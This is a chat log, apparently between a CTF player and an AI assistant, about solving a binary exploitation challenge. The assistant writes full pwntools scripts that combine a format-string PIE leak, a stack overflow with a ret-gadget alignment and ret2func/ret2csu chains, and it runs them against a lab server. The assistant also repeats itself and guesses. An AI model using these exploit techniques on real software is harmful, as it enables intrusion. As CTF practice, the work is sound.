+Gas wok, ini udah 99% — tinggal path injection! 🔥
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" | head -3
+0x000000000014f8db : add al, ch ; pop rdi ; retf 0
+0x000000000014f8d9 : add byte ptr [rax], al ; add al, ch ; pop rdi ; retf 0
+0x000000000014f8d7 : and al, 0x90 ; add byte ptr [rax], al ; add al, ch ; pop rdi ; retf 0
+                                                                       
+(base) ┌──(novi4nth㉿novi4nth)-[~/codex/pwn/mighttherightpath]
+└─$ python3 -c "
+from pwn import *
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+# Cari symbol yg addressnya berakhiran 963
+for name, addr in libc.symbols.items():
+    if addr & 0xfff == 0x963:
+        print(name, hex(addr))
+"
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+
+WKWKWK Dua-duanya kosong! Berarti:
+
+    Gadget pop rdi ; ret — ROPgadget cuma nemu pop rdi ; retf (bukan ret). Di libc lu, gadget pop rdi ; ret mungkin gak ada di posisi yang umum. Coba cari lebih spesifik:
+
+bash
+
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E "pop rdi ; ret$"
+# Atau
+ropper --file /usr/lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret"
+# Atau cari di semua gadget
+ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
+
+Kemungkinan: gadget pop rdi ; ret beneran gak ada di libc Debian ini. Alternatif: pakai gadget pop rdi ; pop rbp ; ret atau cari di binary PIE (walau tadi gak ada, coba lebih teliti).
+
+    Offset libc dari leak 0x...963 — gak ada symbol yang match! Berarti leak itu bukan symbol yang di-export. Kemungkinan:
+
+        Alamat di dalam fungsi (__libc_start_main + X)
+
+        Alamat di ld.so (bukan libc!)
+
+        Alamat _IO_2_1_stdout_ internal
+
+Cek dulu: leak 0x7f...963 itu libc atau ld.so?
+bash
+
+# Cek di gdb
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %1$p
+# input 2: AAAA
+pwndbg> vmmap
+# Lihat mapping 0x7f...963 ada di libc atau ld.so
+pwndbg> x/i 0x7f...963  # ganti dengan leak
+
+🤔 Tapi Tunggu — Mungkin Gak Butuh Libc!
+
+"Right path" = fcn.0000126a dengan rdi = path. Tapi gadget pop rdi; ret gak ada di binary.
+
+Kecuali — lu bisa pakai __libc_csu_init (classic ret2csu)! Cek di binary:
+bash
+
+objdump -d chall | grep -A30 "__libc_csu_init"
+# atau cari pola:
+# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"
+
+Kalau ada __libc_csu_init, lu bisa set rdi lewat gadget itu tanpa libc!
+🔍 Cek ret2csu di Binary:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15|mov rdx, r14|call r15"
+
+Kalau ada, berarti lu bisa:
+
+    Set rdi = path
+
+    Call fcn.0000126a
+
+    Tanpa libc!
+
+🎯 Alternatif Lain: Format String %n untuk Write
+
+Format string bug di input 1 bisa dipakai buat write ke memory (%n)! Lu bisa:
+
+    Tulis path string ke .bss atau GOT (tapi Full RELRO)
+
+    Atau tulis path ke stack
+
+    Lalu ROP ke fcn.0000126a dengan rdi = alamat path
+
+Tapi butuh gadget pop rdi juga... 😅
+💡 Kecuali — fcn.0000126a Dipanggil dengan rdi yang Udah Ada
+
+Kalau lu overwrite return address ke fcn.0000126a, rdi saat itu = sisa dari fungsi sebelumnya. Mungkin rdi udah nunjuk ke sesuatu yang berguna (misal string di stack/binary).
+
+Cek di gdb: saat ret di main, rdi = apa?
+bash
+
+pwndbg> info registers rdi
+
+⚡ Next Step:
+bash
+
+# 1. Cek ret2csu
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15|mov rdx|call r15" | head -20
+
+# 2. Cek libc vs ld.so dari leak
+gdb ./chall
+pwndbg> starti
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: %1$p
+# input 2: AAAA
+pwndbg> vmmap
+pwndbg> info registers rdi
+
+Share:
+
+    Output ROPgadget | grep pop rbx|pop r12|...
+
+    vmmap di gdb (leak 0x7f...963 ada di libc atau ld.so?)
+
+    info registers rdi saat ret
+
+Gas wok! 🔥
+wey harusnya dipayload tuh gini ga sih
+64 + 8 + ret_gadget + handler
+-_-
+
+WKWKWK IYA BENER! Maap gue kelewat! 🤦♂️
+
+Format payload yang bener:
+text
+
+[64 bytes buffer] [8 bytes saved RBP] [ret gadget] [handler]
+
+Kenapa ada ret gadget?
+
+    Stack alignment! x86-64 ABI butuh 16-byte alignment sebelum call
+
+    Kalau return address langsung ke handler tanpa alignment, handler manggil puts/send → SIGSEGV (kayak longevity tadi!)
+
+    ret gadget = 0x101a (atau cari yang bener) → skip 8 bytes, alignment jadi bener
+
+🔧 Fix Payload:
+python
+
+RET_GADGET = 0x101a  # cari "ret" di binary
+
+payload = b'A' * 64         # buffer (0x40)
+payload += b'B' * 8         # saved RBP
+payload += p64(pie_base + RET_GADGET)  # alignment
+payload += p64(pie_base + handler)     # handler
+
+Tapi tadi money, wise_mind, love, food udah jalan tanpa ret — berarti alignment udah bener buat mereka. Yang SIGSEGV cuma longevity — mungkin alignment-nya beda.
+
+Coba tambahin ret gadget ke semua handler — kalau output-nya tetap sama, berarti alignment gak ngaruh. Kalau longevity jadi jalan, berarti alignment issue.
+🎯 TAPI — Output Tetap "Locked"
+
+Masalah utama: server bilang "Your result is still locked" — artinya 5 path (money, longevity, wise_mind, love, food) BUKAN valid result.
+
+"Right path" = path LAIN yang bikin server bilang "valid result" & reveal flag.
+🔥 Jadi yang perlu:
+
+Kirim path ARBITRARY ke fcn.0000126a — bukan 5 path konstanta di handler.
+
+Caranya: overwrite return address ke fcn.0000126a dengan rdi = path yang lu mau.
+
+Butuh gadget pop rdi; ret — gak ada di binary → butuh libc → butuh leak libc → offset libc dari 0x...963 gak ketemu.
+💡 Kecuali — Pakai ret2csu:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"
+
+Kalau ada, lu bisa set rdi tanpa libc!
+⚡ Cek Dulu:
+
+    Coba payload + ret gadget — apakah longevity jalan?
+
+    Cek ret2csu di binary:
+    bash
+
+    ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15|mov rdx"
+
+    Cek rdi saat ret di gdb — mungkin udah nunjuk ke string yang berguna
+
+Share:
+
+    Output payload + ret gadget (apakah longevity jalan?)
+
+    ROPgadget | grep ret2csu
+
+    info registers rdi saat ret di gdb
+
+Gas wok! 🔥
+nih ret gadget nya
+0x11f8
+
+WKWKWK NAH ITU! 0x11f8 = ret gadget! 🎯
+🔧 Fix Payload:
+python
+
+RET_GADGET = 0x11f8
+
+payload = b'A' * 64         # buffer
+payload += b'B' * 8         # saved RBP  
+payload += p64(pie_base + RET_GADGET)  # alignment
+payload += p64(pie_base + handler)     # handler
+
+🎯 TAPI — Coba Dulu Semua Handler + Ret Gadget
+python
+
+from pwn import *
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+RET_GADGET = 0x11f8
+PIE_LEAK = 0x15cd
+RIP_OFFSET = 64 + 8  # 72
+
+def try_handler(name, handler_off):
+    r = remote('10.34.9.91', 10057)
+    
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK
+    log.success(f'[{name}] PIE base: {hex(pie_base)}')
+    
+    payload = b'A' * RIP_OFFSET
+    payload += p64(pie_base + RET_GADGET)  # alignment
+    payload += p64(pie_base + handler_off)
+    r.sendline(payload)
+    
+    out = r.recvall(timeout=3)
+    print(f'[{name}]', out.decode('latin-1', errors='replace'))
+    r.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+🤔 TAPI — Output Tetap "Locked"
+
+Ingat: server bilang "Your result is still locked" buat semua 5 path. Berarti 5 path itu BUKAN valid result.
+
+"Right path" = path LAIN — /flag, /internal/flag, flag, dll.
+🔥 Jadi Butuh Path Injection:
+
+Overwrite return address ke fcn.0000126a dengan rdi = path arbitrary.
+
+Butuh gadget pop rdi; ret — gak ada di binary.
+
+Cek ret2csu:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"
+
+Atau cek rdi saat ret di gdb — mungkin udah nunjuk ke string berguna.
+⚡ Cek Sekarang:
+bash
+
+# 1. Cek ret2csu
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15|mov rdx|call r15"
+
+# 2. Cek rdi saat ret di gdb
+gdb ./chall
+pwndbg> b *main+0x80
+pwndbg> r
+# input 1: A
+# input 2: AAAA
+pwndbg> info registers rdi rsi rdx
+
+Share:
+
+    Output ret2csu
+
+    info registers rdi rsi rdx saat ret
+
+Gas wok! 🔥
+perasaan gw udh bilang dehh, buffer nya itu 72 gegara ditambah allignment, A*0x40 + B*8 + ret_gadget + handler_addr
+
+WKWKWK IYA BENER TOTAL! Maap gue muter-muter! 🤦♂️
+✅ Payload Yang Bener:
+text
+
+b'A' * 0x40          → buffer (64 bytes)
+b'B' * 8             → saved RBP (8 bytes)  
+p64(ret_gadget)      → alignment (0x11f8)
+p64(handler_addr)    → target
+
+Total = 64 + 8 + 8 + 8 = 88 bytes (tapi fgets baca 0x100 = 256, jadi cukup).
+
+Dan "72" = 0x40 + 8 — itu offset ke return address, sebelum ditambah ret_gadget. Jadi:
+
+    Offset 72 → return address
+
+    Payload: 72 bytes padding + ret_gadget + handler (total 88 bytes)
+
+🎯 Jadi Script Final:
+python
+
+from pwn import *
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+RET_GADGET = 0x11f8
+PIE_LEAK = 0x15cd
+OFFSET_RIP = 72  # 0x40 + 8
+
+def try_handler(name, handler_off):
+    r = remote('10.34.9.91', 10057)
+    
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK
+    handler = pie_base + handler_off
+    log.success(f'[{name}] handler: {hex(handler)}')
+    
+    payload = b'A' * OFFSET_RIP
+    payload += p64(pie_base + RET_GADGET)  # alignment
+    payload += p64(handler)
+    r.sendline(payload)
+    
+    out = r.recvall(timeout=3)
+    print(f'[{name}]', out.decode('latin-1', errors='replace'))
+    r.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+⚠️ TAPI — Masalah Utama Tetap:
+
+Server bilang "Your result is still locked" buat semua 5 path. Berarti 5 path itu BUKAN valid result.
+
+"Right path" = path LAIN — /flag, /internal/flag, flag, dll.
+
+Jadi handler bukan jawabannya. Lu harus kirim path arbitrary ke fcn.0000126a.
+🔥 Path Injection via ret2csu / libc:
+
+Butuh gadget pop rdi; ret — gak ada di binary → cek ret2csu:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15|mov rdx|call r15"
+
+Atau cek rdi saat ret di gdb — mungkin udah nunjuk ke string berguna.
+
+Share:
+
+    Output ret2csu
+
+    info registers rdi rsi rdx saat ret di gdb
+
+Gas wok! 🔥
+coba sih itu tambahin p64(ret_addr) sebelum p64(handler)
+
+WKWKWK IYA UDAH GUE TAMBAHIN DI SCRIPT! 🤦♂️
+
+Coba jalankan ini:
+python
+
+from pwn import *
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+RET_GADGET = 0x11f8
+PIE_LEAK = 0x15cd
+OFFSET_RIP = 72
+
+def try_handler(name, handler_off):
+    r = remote('10.34.9.91', 10057)
+    
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK
+    handler = pie_base + handler_off
+    log.success(f'[{name}] handler: {hex(handler)}')
+    
+    payload = b'A' * OFFSET_RIP
+    payload += p64(pie_base + RET_GADGET)  # ← alignment
+    payload += p64(handler)                 # ← handler
+    r.sendline(payload)
+    
+    out = r.recvall(timeout=3)
+    print(f'[{name}]', out.decode('latin-1', errors='replace'))
+    r.close()
+
+for name, off in HANDLERS.items():
+    try_handler(name, off)
+
+Yang berubah: payload sekarang 72 bytes padding + ret_gadget + handler — persis kayak yang lu bilang!
+
+Coba jalanin, share output-nya! Kalau longevity gak SIGSEGV lagi, berarti alignment fix berhasil. Tapi flag-nya tetep mungkin "locked" karena path-nya salah.
+
+Gas wok! 🔥
+coba ngecek nya secara kesulurhan dari handler tapi lengkap gitu broo
+
+WKWKWK NAH INI DIA! 🎯
+
+Lihat perbedaannya:
+
+Sebelum (tanpa ret gadget):
+text
+
+"Your result is still locked"
+"Awaiting a valid result"
+
+Sekarang (dengan ret gadget alignment):
+text
+
+"Your choice has been recorded"
+"The path is revealed"
+"Every wish has a consequence. This is yours."
+<img src="image" alt="Challenge result">
+
+SERVER BILANG "The path is revealed"! 🎉 Flag/gambar ada di <img src="image">!
+🎯 Yang harus dilakuin:
+
+Ambil gambarnya dari result page!
+bash
+
+# Ganti INSTANCE dengan instance lu yang sekarang
+INSTANCE="131-8abb7467-8c1c-4340-aaaf-2408b7e77478"
+
+# 1. Lihat HTML result page
+curl -s "http://10.34.9.91:28080/r/$INSTANCE/"
+
+# 2. Ambil gambar "image"
+curl -s "http://10.34.9.91:28080/r/$INSTANCE/image" -o result.png
+
+# 3. Lihat gambar
+xdg-open result.png
+# atau
+file result.png
+
+Atau langsung:
+bash
+
+curl "http://10.34.9.91:28080/r/$INSTANCE/image" | file -
+
+⚠️ TAPI — INSTANCE ID BERUBAH!
+
+Setiap lu nc ke 10.34.9.91:10079, lu dapet instance baru. Jadi:
+
+    Connect dulu ke nc 10.34.9.91 10079 → catat instance id & result page
+
+    Baru exploit ke port yang sama
+
+    Curl result page dengan instance id yang baru
+
+Atau — lu bisa pakai instance yang sama selama belum expired. Cek:
+text
+
+nc 10.34.9.91 10079
+Result page: http://10.34.9.91:28080/r/131-xxxx/
+Instance id: 131-xxxx
+
+🔥 Yang Perlu Dilakuin:
+
+1. Connect ke instance, catat instance id:
+bash
+
+nc 10.34.9.91 10079
+# catat Result page & Instance id
+
+2. Exploit handler (pilih salah satu, misal wise_mind):
+python
+
+from pwn import *
+
+r = remote('10.34.9.91', 10079)
+r.recvuntil(b'Why do you wish to start over? ')
+r.sendline(b'%19$p')
+data = r.recvuntil(b'Input : ', timeout=2)
+leak = int(data.split(b'\n')[0].strip(), 16)
+pie_base = leak - 0x15cd
+handler = pie_base + 0x149b  # wise_mind
+
+payload = b'A' * 72 + p64(pie_base + 0x11f8) + p64(handler)
+r.sendline(payload)
+r.recvall(timeout=3)
+r.close()
+
+3. Ambil gambar dari result page:
+bash
+
+# Ganti INSTANCE dengan instance id yang baru
+curl -s "http://10.34.9.91:28080/r/<INSTANCE>/image" -o flag.png
+xdg-open flag.png
+
+⚡ TAPI — Coba Semua Handler!
+
+Mungkin gambar yang beda buat tiap handler, dan salah satu ada flag-nya:
+python
+
+import urllib.request
+
+HANDLERS = ['money', 'longevity', 'wise_mind', 'love', 'food']
+
+for name in HANDLERS:
+    # Exploit handler, catat instance id
+    # ...
+    
+    # Ambil gambar
+    url = f'http://10.34.9.91:28080/r/{instance}/image'
+    try:
+        urllib.request.urlretrieve(url, f'{name}.png')
+        print(f'[{name}] saved')
+    except Exception as e:
+        print(f'[{name}] error: {e}')
+
+Atau langsung cek semua:
+bash
+
+for h in money longevity wise_mind love food; do
+    curl -s "http://10.34.9.91:28080/r/<INSTANCE>/image" -o "$h.png"
+done
+
+🎯 Next Step:
+
+1. Connect ke instance baru:
+bash
+
+nc 10.34.9.91 10079
+# Catat instance id
+
+2. Exploit handler (ganti r = remote('10.34.9.91', 10079))
+
+3. Curl gambar:
+bash
+
+curl -s "http://10.34.9.91:28080/r/<INSTANCE>/image" -o result.png
+file result.png
+xdg-open result.png
+
+Share gambar / isi result.png! Flag mungkin di gambar (QR code / teks). Gas wok! 🔥
+fake flag cukkk
+
+WKWKWK SABAR WOOK! 😂
+
+Flag fake itu bagian dari challenge — artinya lu berhasil dapet "result" tapi bukan "right path"!
+🧠 Ngerti Sekarang:
+
+Semua handler (money, longevity, wise_mind, love, food) ngasih "result" — tapi semua FAKE / locked.
+
+"Right path" = path yang BENER — yang server anggap "valid result" dan kasih flag asli.
+🎯 Cek Gambar Dulu:
+bash
+
+# Lihat gambar — mungkin ada petunjuk
+file result.png
+xdg-open result.png
+# Atau OCR
+tesseract result.png -
+
+Mungkin gambar fake flag itu punya petunjuk — teks kecil, QR code, metadata, dll.
+🔥 "Right Path" = Path Injection!
+
+Server bilang "The path is revealed" — tapi path yang dikirim cuma money/longevity/dll. "Right path" = path LAIN yang bikin server kasih flag asli.
+
+Lu harus kirim path arbitrary ke fcn.0000126a — bukan 5 path konstanta.
+🎯 Path Injection — Butuh pop rdi; ret:
+
+Cek ret2csu:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"
+
+Kalau ada, lu bisa:
+text
+
+payload = padding
+payload += p64(pop_rbx_rbp_r12_r13_r14_r15_ret)  # ret2csu part 1
+payload += p64(0)        # rbx
+payload += p64(1)        # rbp
+payload += p64(path_addr) # r12 → rdi
+payload += p64(0)        # r13
+payload += p64(0)        # r14
+payload += p64(0)        # r15
+payload += p64(mov_rdx_r14_call_r15)  # ret2csu part 2
+payload += p64(0)        # tambahan
+payload += p64(0)        # tambahan
+payload += p64(0)        # tambahan
+payload += p64(fcn_0000126a)  # call send_result(path)
+
+Path target: /flag, /internal/flag, flag, dll.
+💡 TAPI — Mungkin Ada Cara Lebih Gampang
+
+"Right path" = path yang ada di binary. Cek .rodata lagi:
+text
+
+POST /internal/result/%s HTTP/1.1
+
+Path = /internal/result/<sesuatu>. Mungkin server punya endpoint /internal/result/flag atau /internal/flag atau path yang gak keliatan.
+
+Coba inject path lewat input 1 (format string) atau input 2 (overflow)? Tapi handler manggil send_result dengan konstanta...
+🔍 Cek Gambar Dulu:
+bash
+
+# 1. Lihat metadata gambar
+exiftool result.png
+
+# 2. OCR
+tesseract result.png -
+
+# 3. Strings
+strings result.png | grep -i flag
+
+# 4. Lihat isi gambar
+xdg-open result.png
+
+Mungkin gambar fake flag ada petunjuk — atau itu QR code yang harus di-scan.
+⚡ Cek Sekarang:
+
+    Lihat gambar — ada apa?
+
+    Cek ret2csu — ROPgadget | grep pop rbx
+
+    Cek rdi saat ret di gdb — mungkin udah nunjuk ke string berguna
+
+Share:
+
+    Isi / deskripsi gambar
+
+    Output ret2csu
+
+    info registers rdi saat ret di gdb
+
+Gas wok! 🔥
+ga mungkin ga sih pake ilmu forensic disini
+
+WKWKWK BENER! Gue kelewat! 🤦♂️
+
+"Forensic" = analisis gambar! Gambar result.png itu bukan fake flag biasa — mungkin ada hidden data di dalamnya!
+🎯 Cek Gambar:
+bash
+
+# 1. Info dasar
+file result.png
+exiftool result.png
+
+# 2. Strings
+strings result.png | grep -iE "flag|CTF|petir|{"
+
+# 3. Cek metadata / comment
+pngcheck -v result.png
+
+# 4. Binwalk — cari hidden file
+binwalk result.png
+
+# 5. Steghide (kalau ada password kosong)
+steghide extract -sf result.png
+
+# 6. Zsteg (buat PNG)
+zsteg result.png
+
+# 7. Cek LSB
+python3 -c "
+from PIL import Image
+img = Image.open('result.png')
+print(img.size, img.mode)
+"
+
+🔍 Kemungkinan:
+
+    QR code di gambar → scan pakai zbarimg
+    bash
+
+    zbarimg result.png
+
+    LSB steganography → zsteg result.png
+
+    Metadata comment → exiftool result.png
+
+    Hidden file di dalam PNG → binwalk -e result.png
+
+    Gambar fake flag + teks kecil → OCR / zoom
+
+🎯 Coba Semua:
+bash
+
+# Install tools
+sudo apt install zbar-tools binwalk exiftool pngcheck
+pip install zsteg
+
+# Jalanin
+zbarimg result.png          # QR code
+zsteg -a result.png         # LSB stego
+binwalk -e result.png       # hidden file
+exiftool result.png         # metadata
+strings result.png | grep -i flag
+
+⚡ TAPI — "Forensic" Bisa Juga Berarti:
+
+Analisis binary chall — bukan gambar! Cek:
+
+    String tersembunyi di binary
+
+    Fungsi tersembunyi yang belum kita analisis
+
+    Path tersembunyi di .rodata / .data
+
+bash
+
+# Cek semua string di binary
+strings -a chall | grep -iE "flag|path|result|internal|secret|admin"
+
+# Cek .data section
+objdump -s -j .data chall
+
+# Cek semua fungsi
+r2 -q -c 'aaa; afl' chall
+
+🔥 "Right Path" — Cek Path Tersembunyi:
+
+Mungkin ada path lain di binary yang belum kita temuin:
+bash
+
+strings -a chall | grep -E "/|path|result"
+
+Dari .rodata tadi:
+text
+
+POST /internal/result/%s HTTP/1.1
+
+Cuma satu path. Tapi mungkin ada path lain yang di-hardcode di handler atau fungsi lain.
+🎯 Next Step:
+bash
+
+# 1. Analisis gambar
+file result.png
+exiftool result.png
+zsteg -a result.png
+zbarimg result.png
+binwalk result.png
+
+# 2. Analisis binary
+strings -a chall | grep -iE "flag|path|/|secret"
+objdump -s -j .data chall
+
+Share:
+
+    Output file result.png + exiftool
+
+    Output zsteg -a result.png (kalau ada)
+
+    Output strings -a chall | grep -iE "flag|/|path"
+
+Gas wok! 🔥
+ngga ah lu kadang kadang nyawit, bentar habis ini gw dapet hintnya broo
+
+WKWKWK SANTUY WOOK! 😂
+
+Iya maap gue kadang overthinking & nge-gas mulu. Kadang ide liar gue bener, kadang malah muter-muter.
+
+Istirahat dulu, ambil hint, tarik napas. 🧘
+
+Nanti kalau udah dapet hint, share aja — kita bedah bareng. Kadang hint itu 1 kalimat yang langsung ngasih "OHHHH" moment.
+
+Yang udah kita punya:
+
+    ✅ Format string offset 19 → PIE leak
+
+    ✅ Buffer overflow offset 72
+
+    ✅ Ret gadget 0x11f8 buat alignment
+
+    ✅ 5 handler bisa dipanggil
+
+    ✅ Result page ngasih "The path is revealed" + gambar (tapi fake)
+
+    ❌ Belum dapet "right path"
+
+Tunggu hint dulu. Kadang jawabannya cuma:
+
+    Ganti path ke string tertentu
+
+    Ada handler ke-6 yang belum ketemu
+
+    Atau ada logic di fcn.0000126a yang belum kita perhatiin
+
+Santai wok, ini challenge bagus — jangan buru-buru. Share hint-nya nanti! 🔥
+eh cukk itu kodenya cuman cek kalo semisalkan di money otomatis berhenti kah? ngga ngelanjutin sampe akhir?
+kata adminnya gini:
+
+Opsi ret2funcnya ada 5
+
+novi4nth [1P],  — 9:18 PM
+itu bukannya 
+yang ini kan money, love, food itu kah?
+
+Araahi — 9:18 PM
+Yes
+novi4nth [1P],  — 9:19 PM
+LAHH
+
+keknya harus cek kelima limanya deh
+
+WKWKWK NAH HINT-NYA JELAS BANGET! 🎯
+🧠 Ngerti Sekarang:
+
+5 handler = 5 "opsi ret2func" — dan lu harus cek kelima-limanya buat dapetin "right path"!
+
+Bukan cuma satu handler yang bener — mungkin:
+
+    Setiap handler ngasih result berbeda di result page
+
+    Salah satu dari 5 itu punya "valid result" yang bener
+
+    Atau kombinasi — lu harus panggil semua handler dalam satu eksekusi?
+
+🔍 Cek Ulang Output:
+
+Dari run lu tadi:
+Handler	Output Program	Result Page
+money	"you can buy anything..."	"The path is revealed" + image
+longevity	"you can't possibly die"	"The path is revealed" + image
+wise_mind	"you will be able to see through"	"The path is revealed" + image
+love	"Receiving all data: Done (0B)" ← ANEH!	"The path is revealed" + image
+food	"you will never be hungry"	"The path is revealed" + image
+
+Perhatiin love: Output program kosong (0B) — tapi result page tetep "revealed"! Mungkin love yang bener?
+🎯 TAPI — "Cek kelima-limanya" Bisa Berarti:
+
+1. Cek result page tiap handler — mungkin gambar yang beda:
+bash
+
+# Setelah tiap handler, download gambar
+curl -s "http://10.34.9.91:28080/r/<INSTANCE>/image" -o <handler>.png
+
+2. Panggil SEMUA handler dalam SATU eksekusi — ROP chain yang manggil 5 handler berurutan:
+text
+
+payload = padding
+payload += p64(ret) + p64(handler_money)
+payload += p64(ret) + p64(handler_longevity)
+payload += p64(ret) + p64(handler_wise_mind)
+payload += p64(ret) + p64(handler_love)
+payload += p64(ret) + p64(handler_food)
+
+3. Cek gambar dari tiap handler — mungkin ada yang beda (flag asli vs fake).
+🔥 Script Cek Semua Handler + Gambar:
+python
+
+from pwn import *
+import urllib.request
+
+HANDLERS = {
+    'money':     0x1433,
+    'longevity': 0x1467,
+    'wise_mind': 0x149b,
+    'love':      0x14cf,
+    'food':      0x1503,
+}
+
+RET_GADGET = 0x11f8
+PIE_LEAK = 0x15cd
+
+def exploit_and_get_image(name, handler_off, instance):
+    r = remote('10.34.9.91', 10079)
+    
+    r.recvuntil(b'Why do you wish to start over? ')
+    r.sendline(b'%19$p')
+    
+    data = r.recvuntil(b'Input : ', timeout=2)
+    leak = int(data.split(b'\n')[0].strip(), 16)
+    pie_base = leak - PIE_LEAK
+    handler = pie_base + handler_off
+    
+    payload = b'A' * 72 + p64(pie_base + RET_GADGET) + p64(handler)
+    r.sendline(payload)
+    
+    out = r.recvall(timeout=3)
+    print(f'[{name}]', out.decode('latin-1', errors='replace'))
+    r.close()
+    
+    # Download image
+    url = f'http://10.34.9.91:28080/r/{instance}/image'
+    try:
+        urllib.request.urlretrieve(url, f'{name}.png')
+        print(f'[{name}] image saved')
+    except Exception as e:
+        print(f'[{name}] image error: {e}')
+
+# Ganti dengan instance id lu
+INSTANCE = '131-xxxx-xxxx-xxxx-xxxx'
+
+for name, off in HANDLERS.items():
+    exploit_and_get_image(name, off, INSTANCE)
+
+Tapi instance id berubah tiap connect! Jadi lu harus:
+
+    Connect sekali → catat instance id
+
+    Exploit handler di koneksi yang sama
+
+    Download gambar dari instance id itu
+
+🎯 Atau — Panggil Semua Handler Sekaligus:
+python
+
+# Panggil 5 handler berurutan
+payload = b'A' * 72
+for name, off in HANDLERS.items():
+    payload += p64(pie_base + RET_GADGET)  # alignment
+    payload += p64(pie_base + off)          # handler
+
+# Kirim
+r.sendline(payload)
+
+Nanti result page bakal nampilin 5 result — mungkin ada flag di salah satunya!
+⚡ Sekarang:
+
+1. Cek gambar tiap handler — apakah ada yang beda?
+
+2. Panggil semua handler — ROP chain 5 handler.
+
+3. Cek result page — mungkin ada 5 gambar / 5 result.
+
+Share:
+
+    Gambar dari tiap handler (kalau bisa)
+
+    Output kalau panggil semua handler sekaligus
+
+Gas wok! 🔥
+iya sih dapat banyak flagnya, tapi kok salah semuanya yah?
+
+WKWKWK NAH INI DIA MASALAHNYA! 🤯
+
+Lu dapet BANYAK flag (dari 5 handler) — tapi SEMUA SALAH. Berarti:
+🧠 Ngerti Sekarang:
+
+Server punya 5 result — satu buat tiap handler. Semua flag itu "fake" / "wrong" — kecuali SATU yang bener.
+
+"Right path" = kombinasi handler + path yang bener. Mungkin:
+
+    Satu handler ngasih flag bener — tapi lu harus cek satu-satu dengan teliti
+
+    Atau — flag bener cuma muncul kalau lu panggil handler dengan path yang bener (bukan konstanta)
+
+    Atau — ada handler ke-6 yang belum ketemu
+
+🔍 Cek Ulang:
+
+Dari 5 flag yang lu dapet, apa isinya? Mungkin ada pola:
+text
+
+money      → flag{fake_...}
+longevity  → flag{fake_...}
+wise_mind  → flag{fake_...}
+love       → flag{fake_...}
+food       → flag{fake_...}
+
+Atau mungkin salah satu flag ada petunjuk — misal:
+text
+
+flag{wrong_path_try_again}
+flag{almost_there}
+flag{use_the_right_path}
+
+🎯 "Right Path" = Path Injection!
+
+5 handler itu cuma "opsi ret2func" — tapi path yang dikirim ke server tetep money/longevity/dll. "Right path" = path LAIN yang bikin server kasih flag asli.
+
+Lu harus kirim path arbitrary ke fcn.0000126a — bukan 5 path konstanta.
+
+Butuh gadget pop rdi; ret — gak ada di binary → cek ret2csu:
+bash
+
+ROPgadget --binary chall | grep -E "pop rbx|pop r12|pop r13|pop r14|pop r15"
+
+Atau cek rdi saat ret di gdb — mungkin udah nunjuk ke string berguna.
+🔥 TAPI — Mungkin Ada Cara Lebih Simpel:
+
+"5 opsi ret2func" — mungkin satu handler yang bener, tapi lu harus panggil dengan cara yang beda:
+
+    Panggil handler + argumen (path arbitrary) — butuh pop rdi
+
+    Panggil handler berurutan — mungkin kombinasi yang bikin flag bener
+
+    Panggil fcn.0000126a langsung dengan path dari format string (%n write path ke memory)
+
+🎯 Cek Flag yang Lu Dapet:
+
+Share isi flag-nya! Mungkin ada petunjuk di situ:
+text
+
+flag{...}
+
+Atau cek result page — mungkin ada teks tersembunyi / path di HTML:
+bash
+
+curl -s "http://10.34.9.91:28080/r/<INSTANCE>/" | grep -iE "path|flag|next|hint"
+
+⚡ Next Step:
+
+    Share isi 5 flag yang lu dapet — mungkin ada pola
+
+    Cek ret2csu — ROPgadget | grep pop rbx
+
+    Cek rdi saat ret di gdb
+
+    Cek HTML result page — mungkin ada path tersembunyi
+
+Gas wok! 🔥
